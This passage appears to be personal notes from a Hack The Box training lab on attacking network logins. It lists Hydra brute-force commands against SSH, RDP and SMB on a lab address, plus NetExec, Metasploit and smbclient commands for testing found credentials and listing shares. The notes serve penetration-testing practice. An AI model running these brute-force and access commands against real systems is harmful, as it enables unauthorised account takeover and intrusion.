...
```
`(Pwn3d!)` is the sign that we can most likely execute system commands if we log in with the brute-forced user.
#### Evil-WinRM
...
#### Hydra - SSH
```bash
hcx05@htb[/htb]$ hydra -L user.list -P password.list ssh://10.129.42.197
...
#### Hydra - RDP
```bash
hcx05@htb[/htb]$ hydra -L user.list -P password.list rdp://10.129.42.197
...
#### Hydra - SMB
```bash
hcx05@htb[/htb]$ hydra -L user.list -P password.list smb://10.129.42.197
...
Try using `msf` to avoid error
```bash
hcx05@htb[/htb]$ msfconsole -q
...
#### NetExec
```bash
hcx05@htb[/htb]$ netexec smb 10.129.42.197 -u "user" -p "password" --shares
...
#### Smbclient
```bash
hcx05@htb[/htb]$ smbclient -U user \\\\10.129.42.197\\SHARENAME
